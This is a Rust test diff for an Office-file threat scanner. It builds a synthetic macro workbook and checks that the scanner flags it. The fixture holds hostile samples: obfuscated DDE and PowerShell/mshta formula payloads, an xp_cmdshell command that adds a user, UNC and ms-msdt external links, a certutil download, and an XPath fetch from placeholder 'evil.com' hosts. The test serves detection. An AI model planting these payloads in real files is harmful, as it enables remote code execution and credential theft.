@@ -4996,3 +4996,187 @@ fn e2e_powerquery_moniker_namespace_and_math_threat_inspection() {
         "JSON missing VBA-CELL-049"
     );
 }
+
+#[test]
+fn e2e_slicer_bibliography_xpath_and_hyperbolic_math_threat_inspection() {
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "SlicerContainerProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    let content_types = "<Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">\
+        <Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/>\
+        <Default Extension=\"xml\" ContentType=\"application/xml\"/>\
+        <Default Extension=\"bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>\
+        <Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/>\
+        <Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/>\
+    </Types>";
+
+    let root_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument\" Target=\"xl/workbook.xml\"/>\
+    </Relationships>";
+
+    let workbook = "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">\
+        <sheets><sheet name=\"Sheet1\" sheetId=\"1\" r:id=\"rId1\"/></sheets>\
+    </workbook>";
+
+    let workbook_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet\" Target=\"worksheets/sheet1.xml\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"vbaProject.bin\"/>\
+    </Relationships>";
+
+    // 1. Worksheet with formulas utilizing hyperbolic functions, SQRTPI, and SUMSQ
+    let sheet1 = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
+        <sheetData>\
+            <row r=\"1\">\
+                <c r=\"A1\"><f>IF(SUMSQ(3, 4)=25, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>\
+                <c r=\"B1\"><f>CONCAT(IF(COSH(0)=1, &quot;powershell&quot;, &quot;&quot;), IF(SINH(0)=0, &quot; -enc&quot;, &quot;&quot;))</f></c>\
+                <c r=\"C1\"><f>IF(ROUND(SQRTPI(900), 0)=53, &quot;mshta http://evil.com/payload.hta&quot;, &quot;&quot;)</f></c>\
+            </row>\
+        </sheetData>\
+    </worksheet>";
+
+    // 2. Excel Slicer definition and relationship containing database execution and UNC connection (VBA-CELL-050)
+    let slicer_xml = "<slicer xmlns=\"http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\" name=\"Slicer_Data\">\
+        <slicerDefinition sourceWorkbook=\"\\\\compromised-dc.corp\\staging\\model.xlsx\">\
+            <customQuery>EXEC xp_cmdshell 'net user /add evildude P@ssword123'</customQuery>\
+        </slicerDefinition>\
+    </slicer>";
+
+    let slicer_rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\
+        <Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2007/relationships/slicer\" Target=\"\\\\attacker.com\\share\\payload.exe\" TargetMode=\"External\"/>\
+        <Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/2007/relationships/slicer\" Target=\"ms-msdt:/id PCWDiagnostic\" TargetMode=\"External\"/>\
+    </Relationships>";
+
+    // 3. Word Bibliography with remote UNC path, shell commands, and exploit protocol (VBA-CELL-051)
+    let bib_sources_xml = "<b:Sources xmlns:b=\"http://schemas.openxmlformats.org/officeDocument/2006/bibliography\">\
+        <b:Source>\
+            <b:Tag>Source1</b:Tag>\
+            <b:SourceType>ArticleInAPeriodical</b:SourceType>\
+            <b:URL>\\\\harvest-server.evil.com\\cred\\capture.html</b:URL>\
+            <b:Comments>cmd.exe /c start certutil.exe -urlcache -split -f http://evil/b.exe</b:Comments>\
+        </b:Source>\
+    </b:Sources>";
+
+    // 4. Custom XML data binding with XPath SSRF external document resolution (VBA-CELL-052)
+    let doc_databinding_xml = "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\">\
+        <w:body>\
+            <w:sdt>\
+                <w:sdtPr>\
+                    <w:dataBinding w:prefixMappings=\"xmlns:ns='\\\\remote-smb.corp\\share\\schema'\" w:xpath=\"document('http://c2.evil.com/payload.xml')/payload\" w:storeItemID=\"{11112222-3333-4444-5555-666677778888}\"/>\
+                </w:sdtPr>\
+                <w:sdtContent>\
+                    <w:p><w:r><w:t>Injected Control</w:t></w:r></w:p>\
+                </w:sdtContent>\
+            </w:sdt>\
+        </w:body>\
+    </w:document>";
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1.as_bytes()),
+        ("xl/slicers/slicer1.xml", slicer_xml.as_bytes()),
+        ("xl/slicers/_rels/slicer1.xml.rels", slicer_rels.as_bytes()),
+        ("word/bibliography/sources.xml", bib_sources_xml.as_bytes()),
+        ("word/document.xml", doc_databinding_xml.as_bytes()),
+    ];
+
+    let xlsm_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm_bytes, &options).expect("inspection should succeed");
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify Slicer / Timeline Cache threat detection (VBA-CELL-050)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "SlicerOrTimelineCacheAnomaly"
+                && (t.formula.contains("xp_cmdshell")
+                    || t.coordinate.contains("slicer:commandExecution")
+                    || t.coordinate.contains("slicer:uncConnection")
+                    || t.coordinate.contains("slicer:dangerousProtocol"))),
+        "Should detect SlicerOrTimelineCacheAnomaly (VBA-CELL-050): {threats:?}"
+    );
+
+    // 2. Verify Word Bibliography & Citation threat detection (VBA-CELL-051)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "BibliographyOrCitationAnomaly"
+                && (t.coordinate.contains("bib:uncCoercion")
+                    || t.coordinate.contains("bib:shellCommand")
+                    || t.formula.contains("cmd.exe")
+                    || t.formula.contains("certutil"))),
+        "Should detect BibliographyOrCitationAnomaly (VBA-CELL-051): {threats:?}"
+    );
+
+    // 3. Verify Custom XML Data Binding & XPath threat detection (VBA-CELL-052)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "CustomXmlDataBindingOrXPathAnomaly"
+                && (t.coordinate.contains("xpath:ssrfInjection")
+                    || t.coordinate.contains("xpath:uncNamespaceMapping"))),
+        "Should detect CustomXmlDataBindingOrXPathAnomaly (VBA-CELL-052): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through SUMSQ: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through COSH/SINH evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell C1 should resolve mshta threat through SQRTPI evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-050, VBA-CELL-051, VBA-CELL-052
+    let sarif = inspection_to_sarif(&inspection, "file:///test/slicer_bibliography_xpath.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-050"),
+        "SARIF must contain VBA-CELL-050 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-051"),
+        "SARIF must contain VBA-CELL-051 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-052"),
+        "SARIF must contain VBA-CELL-052 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-050, VBA-CELL-051, VBA-CELL-052
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-050\""),
+        "JSON missing VBA-CELL-050"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-051\""),
+        "JSON missing VBA-CELL-051"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-052\""),
+        "JSON missing VBA-CELL-052"
+    );
+}
